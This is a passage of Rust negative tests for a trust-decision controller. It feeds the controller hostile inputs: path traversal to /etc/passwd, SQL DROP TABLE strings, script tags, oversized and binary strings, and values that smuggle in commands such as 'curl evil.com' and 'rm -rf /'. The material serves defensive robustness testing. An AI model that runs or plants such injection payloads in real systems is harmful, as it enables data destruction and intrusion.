            ("decision\u{200B}invisible", "endpoint\u{FEFF}bom", "token\u{202E}rtl"),

            // Path traversal attempts
            ("../../../etc/passwd", "endpoint", "token"),
            ("decision", "../../../proc/version", "token"),
            ("decision", "endpoint", "../../../../bin/sh"),

            // Script injection attempts
            ("decision<script>alert(1)</script>", "endpoint", "token"),
            ("decision", "endpoint'; DROP TABLE decisions; --", "token"),
            ("decision", "endpoint", "token && curl evil.com"),

            // Extremely long identifiers
            (&"x".repeat(100_000), "endpoint", "token"),
            ("decision", &"y".repeat(100_000), "token"),
            ("decision", "endpoint", &"z".repeat(100_000)),

            // Binary data injection
            (&format!("decision{}", String::from_utf8_lossy(&[0xFF, 0xFE, 0xFD])), "endpoint", "token"),
            ("decision", "endpoint\x00\x01\x02", "token"),
        ];

        for (i, (decision_id, endpoint_group, token)) in malicious_decision_cases.iter().enumerate() {
            let malicious_context = TrustDecisionContext {
                decision_id: decision_id.to_string(),
                endpoint_group: endpoint_group.to_string(),
                token: token.to_string(),
                epoch: i as u64 + 1,
                capability_set: vec![
                    format!("capability-{}", i),
                    format!("unicode-cap-{}", decision_id),
                ],
                clock_value: format!("2026-01-{:02}T00:00:00Z", (i % 28) + 1),
                chain_depth: i as u32,
            };

            let malicious_decision = TrustDecision {
                context: malicious_context,
                outcome: match i % 4 {
                    0 => TrustOutcome::Grant,
                    1 => TrustOutcome::Deny,
                    2 => TrustOutcome::Escalate,
                    _ => TrustOutcome::Degraded,
                },
                reason: format!("Unicode test reason {}", i),
                decided_at: format!("2026-01-{:02}T01:00:00Z", (i % 28) + 1),
            };

            let record_result = controller.record_decision(malicious_decision);

            match record_result {
                Ok(()) => {
                    // Successfully recorded - verify no corruption
                },
                Err(_) => {
                    // Acceptable to reject malformed input
                }
            }
        }

        // Audit log should handle Unicode content safely
        let events = controller.events();
        for event in events {
            assert!(!event.event_code.is_empty());
            // Should not be corrupted by Unicode injection
        }

        // Metrics should remain stable despite Unicode input
        let metrics = controller.complexity_metrics();
        assert!(metrics.current_decisions <= u32::try_from(malicious_decision_cases.len()).unwrap_or(u32::MAX));
    }

    #[test]
    fn negative_extreme_epoch_arithmetic_overflow_protection() {
        // Test epoch handling with extreme values near u64::MAX
        let mut controller = TrustComplexityController::new(50, 1000);

        let extreme_epoch_cases = vec![
            0,                              // Minimum epoch
            1,                              // Just above minimum
            u64::MAX.saturating_sub(1000),  // Near maximum
            u64::MAX.saturating_sub(1),     // One below maximum
            u64::MAX,                       // Maximum epoch
        ];

        for (i, extreme_epoch) in extreme_epoch_cases.iter().enumerate() {
            let extreme_context = TrustDecisionContext {
                decision_id: format!("extreme-epoch-{}", i),
                endpoint_group: "epoch-stress-test".to_string(),
                token: format!("extreme-token-{}", i),
                epoch: *extreme_epoch,
                capability_set: vec![format!("epoch-cap-{}", extreme_epoch)],
                clock_value: format!("2026-01-{:02}T00:00:00Z", (i % 28) + 1),
                chain_depth: i as u32,
            };

            let extreme_decision = TrustDecision {
                context: extreme_context,
                outcome: TrustOutcome::Grant,
                reason: format!("Extreme epoch test {}", extreme_epoch),
                decided_at: format!("2026-01-{:02}T02:00:00Z", (i % 28) + 1),
            };

            let record_result = controller.record_decision(extreme_decision);

            match record_result {
                Ok(()) => {
                    // Successfully recorded extreme epoch
                },
                Err(_) => {
                    // May reject extreme values for safety
                }
            }
        }

        // Test replay with extreme epochs
        for (i, extreme_epoch) in extreme_epoch_cases.iter().enumerate() {
            let decision_id = format!("extreme-epoch-{}", i);
            let replay_result = controller.replay_decision(&decision_id, |original_context| {
                // Return same context to avoid divergence
                Ok(TrustDecisionContext {
                    epoch: *extreme_epoch, // Use extreme epoch
                    ..original_context.clone()
                })
            });

            match replay_result {
                Ok(result) => {
                    // Should handle extreme epochs without arithmetic overflow
                    assert_eq!(result.original_outcome, result.replayed_outcome);
                    assert!(result.is_deterministic);
                },
                Err(_) => {
                    // May fail if decision wasn't recorded due to extreme epoch
                }
            }
        }

        // Metrics should handle extreme epochs safely
        let metrics = controller.complexity_metrics();
        assert!(metrics.replay_success_rate <= 1.0);
        assert!(metrics.replay_success_rate >= 0.0);
    }

    #[test]
    fn negative_malformed_capability_set_injection_and_overflow() {
        // Test capability sets with malformed, massive, and malicious content
        let mut controller = TrustComplexityController::new(100, 1000);

        let malformed_capability_sets = vec![
            // Empty capability set
            vec![],

            // Massive capability set
            (0..10_000).map(|i| format!("capability-{:06}", i)).collect(),

            // Capabilities with malicious content
            vec![
                "capability\0null-injection".to_string(),
                "capability🚀unicode-attack".to_string(),
                "../../../etc/passwd".to_string(),
                "cap'; DROP TABLE capabilities; --".to_string(),
                "cap && rm -rf /".to_string(),
                "cap<script>alert('xss')</script>".to_string(),
            ],

            // Binary data in capabilities
            vec![
                String::from_utf8_lossy(b"\xFF\xFE\xFD\xFC").to_string(),
                String::from_utf8_lossy(b"\x00\x01\x02\x03").to_string(),
            ],

            // Extremely long capability names
            vec![
                "x".repeat(1_000_000),
                "capability-".to_string() + &"y".repeat(100_000),
            ],

            // Duplicate capabilities (potential deduplication issues)
            vec![
                "duplicate".to_string(),
                "duplicate".to_string(),
                "duplicate".to_string(),
                "normal-cap".to_string(),
                "duplicate".to_string(),
            ],
        ];

        for (i, capability_set) in malformed_capability_sets.into_iter().enumerate() {
            let malformed_context = TrustDecisionContext {
                decision_id: format!("malformed-caps-{}", i),
                endpoint_group: "capability-test".to_string(),
                token: format!("cap-token-{}", i),
                epoch: i as u64 + 1,
                capability_set,
                clock_value: format!("2026-01-{:02}T03:00:00Z", (i % 28) + 1),
                chain_depth: i as u32,
            };

            let malformed_decision = TrustDecision {
                context: malformed_context,
                outcome: TrustOutcome::Grant,
                reason: format!("Capability set test {}", i),
                decided_at: format!("2026-01-{:02}T04:00:00Z", (i % 28) + 1),
            };

            let record_result = controller.record_decision(malformed_decision);

            match record_result {
                Ok(()) => {
                    // Successfully recorded - test replay
                    let decision_id = format!("malformed-caps-{}", i);
                    let replay_result = controller.replay_decision(&decision_id, |context| {
                        // Return same context to test capability set handling
                        Ok(context.clone())
                    });

                    match replay_result {
                        Ok(result) => {
                            assert!(result.is_deterministic);
                        },
                        Err(_) => {
                            // May fail due to malformed capability sets
                        }
                    }
                },
                Err(_) => {
                    // Acceptable to reject malformed capability sets
                }
            }
        }

        // Controller should remain stable despite malformed capability sets
        let metrics = controller.complexity_metrics();
        assert!(metrics.current_decisions <= 10); // Should have bounded acceptance
    }

    #[test]
    fn negative_degraded_mode_timing_and_duration_boundary_testing() {
        // Test degraded mode with extreme timing and duration edge cases
        let mut controller = TrustComplexityController::new(50, 500);

        // Record decisions that will trigger degraded mode
        for i in 0..5 {
            let decision = make_decision(&format!("degraded-trigger-{}", i), TrustOutcome::Degraded, i);
            let _ = controller.record_decision(decision);
        }

        // Test degraded mode with extreme durations
        let extreme_durations = vec![
            0,                              // Zero duration (immediate expiry)
            1,                              // Minimal duration
            u64::MAX.saturating_sub(1000),  // Near maximum duration
            u64::MAX,                       // Maximum duration
        ];

        for (i, duration_ms) in extreme_durations.iter().enumerate() {
            let degraded_result = controller.enter_degraded_mode(
                format!("extreme-degraded-{}", i),
                *duration_ms,
                1000 + i as u64,
            );

            match degraded_result {
                Ok(()) => {
                    // Test decisions in degraded mode
                    let degraded_decision = TrustDecision {
                        context: TrustDecisionContext {
                            decision_id: format!("during-degraded-{}", i),
                            endpoint_group: "degraded-endpoint".to_string(),
                            token: format!("degraded-token-{}", i),
                            epoch: 100 + i as u64,
                            capability_set: vec!["degraded-cap".to_string()],
                            clock_value: format!("2026-01-{:02}T05:00:00Z", (i % 28) + 1),
                            chain_depth: 0,
                        },
                        outcome: TrustOutcome::Degraded,
                        reason: format!("Degraded mode decision with duration {}", duration_ms),
                        decided_at: format!("2026-01-{:02}T06:00:00Z", (i % 28) + 1),
                    };

                    let record_result = controller.record_decision(degraded_decision);

                    // Should handle degraded mode decisions
                    match record_result {
                        Ok(()) => {},
                        Err(_) => {
                            // May reject decisions in degraded mode
                        }
                    }

                    // Test degraded mode exit with extreme timestamps
                    let extreme_exit_time = match duration_ms {
                        &u64::MAX => u64::MAX.saturating_sub(100), // Avoid overflow
                        &0 => 2000 + i as u64, // Already expired
                        _ => 1000 + i as u64 + duration_ms, // Normal expiry
                    };

                    let exit_result = controller.exit_degraded_mode(
                        &format!("extreme-degraded-{}", i),
                        extreme_exit_time,
                    );

                    match exit_result {
                        Ok(()) => {
                            // Successfully exited degraded mode
                        },
                        Err(_) => {
                            // May fail due to timing issues or extreme values
                        }
                    }
                },
                Err(_) => {
                    // Acceptable to reject extreme durations
                }
            }
        }

        // Metrics should handle extreme timing safely
        let metrics = controller.complexity_metrics();
        assert!(metrics.degraded_mode_entries < u32::MAX); // Should not overflow
    }

    #[test]
    fn negative_replay_function_corruption_and_determinism_violation() {
        // Test replay function behavior with corrupted and non-deterministic responses
        let mut controller = TrustComplexityController::new(100, 1000);

        // Record some baseline decisions
        for i in 0..5 {
            let decision = make_decision(&format!("replay-test-{}", i), TrustOutcome::Grant, i);
            controller.record_decision(decision).expect("record decision");
        }

        // Test replay with various corruption scenarios
        let corruption_scenarios = vec![
            // Return completely different context
            ("different_context", |original: TrustDecisionContext| {
                Ok(TrustDecisionContext {
                    decision_id: "CORRUPTED".to_string(),
                    endpoint_group: "EVIL".to_string(),
                    token: "HACKED".to_string(),
                    epoch: u64::MAX,
                    capability_set: vec!["admin".to_string(), "root".to_string()],
                    clock_value: "1970-01-01T00:00:00Z".to_string(),
                    chain_depth: original.chain_depth.saturating_add(9999),
                })
            }),

            // Return error occasionally (non-deterministic)
            ("intermittent_error", |_: TrustDecisionContext| {
                Err("Simulated intermittent failure".to_string())
            }),

            // Modify epoch in non-deterministic way
            ("epoch_manipulation", |mut context: TrustDecisionContext| {
                context.epoch = context.epoch.saturating_mul(2).saturating_add(1);
                Ok(context)
            }),

            // Inject massive capability sets
            ("capability_flood", |mut context: TrustDecisionContext| {
                context.capability_set = (0..10_000)
                    .map(|i| format!("injected-cap-{:06}", i))
                    .collect();
                Ok(context)
            }),

            // Unicode injection in replayed context
            ("unicode_injection", |mut context: TrustDecisionContext| {
                context.decision_id = format!("🚀{}", context.decision_id);
                context.endpoint_group = format!("攻击-{}", context.endpoint_group);
                context.token = format!("кибер-{}", context.token);
                Ok(context)
            }),
        ];

        for (scenario_name, replay_func) in corruption_scenarios {
            for i in 0..5 {
                let decision_id = format!("replay-test-{}", i);
                let replay_result = controller.replay_decision(&decision_id, &replay_func);

                match replay_result {
                    Ok(result) => {
                        // If replay succeeded, verify determinism detection
                        match scenario_name {
                            "different_context" | "epoch_manipulation" | "capability_flood" | "unicode_injection" => {
                                // Should detect non-determinism due to context changes
                                assert!(!result.is_deterministic,
                                       "Should detect non-determinism in scenario: {}", scenario_name);
                                assert_ne!(result.original_outcome, result.replayed_outcome);
                            },
                            _ => {
                                // Other scenarios may or may not be deterministic
                            }
                        }
                    },
                    Err(TrustComplexityError::ReplayFailed { .. }) => {
                        // Expected for intermittent_error scenario
                        assert_eq!(scenario_name, "intermittent_error");
                    },
                    Err(_) => {
                        // Other errors acceptable for corrupted inputs
                    }
                }
            }
        }

        // Metrics should track replay attempts and failures
        let metrics = controller.complexity_metrics();
        assert!(metrics.total_replays > 0);
    }

    #[test]
    fn negative_audit_log_memory_exhaustion_under_decision_burst() {
        // Test audit log behavior under rapid decision recording bursts
        let mut controller = TrustComplexityController::new(1000, 5000);

        // Generate decision bursts far exceeding normal capacity
        let burst_cycles = 50;
        let decisions_per_cycle = 200;

        for cycle in 0..burst_cycles {
            for decision_num in 0..decisions_per_cycle {
                let decision_id = format!("burst-{:03}-{:04}", cycle, decision_num);
                let decision_context = TrustDecisionContext {
                    decision_id: decision_id.clone(),
                    endpoint_group: format!("burst-endpoint-{}", cycle),
                    token: format!("burst-token-{}-{}", cycle, decision_num),
                    epoch: cycle as u64 * 1000 + decision_num as u64,
                    capability_set: vec![
                        format!("burst-cap-{}", cycle),
                        format!("decision-cap-{}", decision_num),
                    ],
                    clock_value: format!("2026-{:02}-{:02}T{:02}:00:00Z",
                                        (cycle % 12) + 1,
                                        (decision_num % 28) + 1,
                                        decision_num % 24),
                    chain_depth: (cycle + decision_num) as u32,
                };

                let decision = TrustDecision {
                    context: decision_context,
                    outcome: match (cycle + decision_num) % 4 {
                        0 => TrustOutcome::Grant,
                        1 => TrustOutcome::Deny,
                        2 => TrustOutcome::Escalate,
                        _ => TrustOutcome::Degraded,
                    },
                    reason: format!("Burst decision {}-{}", cycle, decision_num),
                    decided_at: format!("2026-{:02}-{:02}T{:02}:30:00Z",
                                       (cycle % 12) + 1,
                                       (decision_num % 28) + 1,
                                       decision_num % 24),
                };

                let record_result = controller.record_decision(decision);

                match record_result {
                    Ok(()) => {},
                    Err(TrustComplexityError::BudgetExceeded { .. }) => {
                        // Expected when budget exceeded
                        break;
                    },
                    Err(_) => {
                        // Other capacity errors acceptable under burst
                        break;
                    }
                }
            }

            // Periodic complexity checks during burst
            let metrics = controller.complexity_metrics();
            assert!(metrics.current_decisions <= MAX_DECISIONS as u32);
        }

        // Events should be bounded despite massive decision burst
        let events = controller.events();
        assert!(events.len() <= MAX_EVENTS); // Should respect capacity limits

        // All events should be well-formed despite high volume
        for event in &events {
            assert!(!event.event_code.is_empty());
            assert!(!event.decision_id.is_empty());
            assert!(!event.description.is_empty());
        }

        // Final metrics should be consistent
        let final_metrics = controller.complexity_metrics();
        assert!(final_metrics.total_decisions >= final_metrics.current_decisions);
        assert!(final_metrics.total_replays <= final_metrics.total_decisions);
    }

    #[test]
    fn negative_clock_value_format_injection_and_parsing_edge_cases() {
        // Test clock value handling with malformed, extreme, and malicious formats
        let mut controller = TrustComplexityController::new(100, 1000);

        let malicious_clock_values = vec![
            // Empty and minimal values
            "",
            " ",
            "T",

            // Invalid date formats
            "2026-13-40T25:70:90Z", // Invalid month, day, hour, minute, second
            "0000-00-00T00:00:00Z", // Zero date
            "9999-99-99T99:99:99Z", // Extreme values

            // Injection attempts
            "2026-01-01T00:00:00Z'; DROP TABLE clocks; --",
            "2026-01-01T00:00:00Z && curl evil.com",
            "2026-01-01T00:00:00Z<script>alert('time')</script>",

            // Unicode and control characters
            "2026-01-01T🕐:00:00Z",
            "2026-01-01T00:00:00\0Z",
            "2026-01-01T00:00:00\r\nZ",
            "2026-01-01T00:00:00\x1B[HZ",

            // Path traversal
            "../../../etc/timezone",
            "/proc/version",

            // Binary data
            &format!("{}-01-01T00:00:00Z", String::from_utf8_lossy(&[0xFF, 0xFE, 0xFD])),
            &format!("2026-01-01T00:00:00{}", String::from_utf8_lossy(&[0x00, 0x01, 0x02])),

            // Extremely long timestamps
            &"2026-01-01T00:00:00".repeat(10000),

            // Format variations and edge cases
            "2026-01-01T00:00:00+00:00", // Different timezone format
            "2026-01-01 00:00:00", // Missing T separator
            "01-01-2026T00:00:00Z", // Different date order
            "2026/01/01T00:00:00Z", // Different separators
        ];

        for (i, clock_value) in malicious_clock_values.iter().enumerate() {
            let malicious_context = TrustDecisionContext {
                decision_id: format!("clock-test-{}", i),
                endpoint_group: "clock-endpoint".to_string(),
                token: format!("clock-token-{}", i),
                epoch: i as u64 + 1,
                capability_set: vec!["clock-cap".to_string()],
                clock_value: clock_value.to_string(),
                chain_depth: i as u32,
            };

            let malicious_decision = TrustDecision {
                context: malicious_context,
                outcome: TrustOutcome::Grant,
                reason: format!("Clock value test {}", i),
                decided_at: "2026-01-01T07:00:00Z".to_string(), // Normal decided_at
            };

            let record_result = controller.record_decision(malicious_decision);

            match record_result {
                Ok(()) => {
                    // Successfully recorded - test replay with malicious clock
                    let decision_id = format!("clock-test-{}", i);
                    let replay_result = controller.replay_decision(&decision_id, |context| {
                        // Return same context to test clock value handling
                        Ok(context.clone())
                    });

                    match replay_result {
                        Ok(result) => {
                            // Should handle malicious clock values safely
                            assert!(result.is_deterministic || !result.is_deterministic); // Basic sanity
                        },
                        Err(_) => {
                            // May fail due to malformed clock values
                        }
                    }
                },
                Err(_) => {
                    // Acceptable to reject malformed clock values
                }
            }
        }

        // Clock value corruption should not affect other functionality
        let metrics = controller.complexity_metrics();
        assert!(metrics.current_decisions <= u32::try_from(malicious_clock_values.len()).unwrap_or(u32::MAX));

        // Events should handle clock value edge cases safely
        let events = controller.events();
        for event in events {
            assert!(!event.event_code.is_empty());
            // Event fields should not be corrupted by malicious clock values
        }
    }
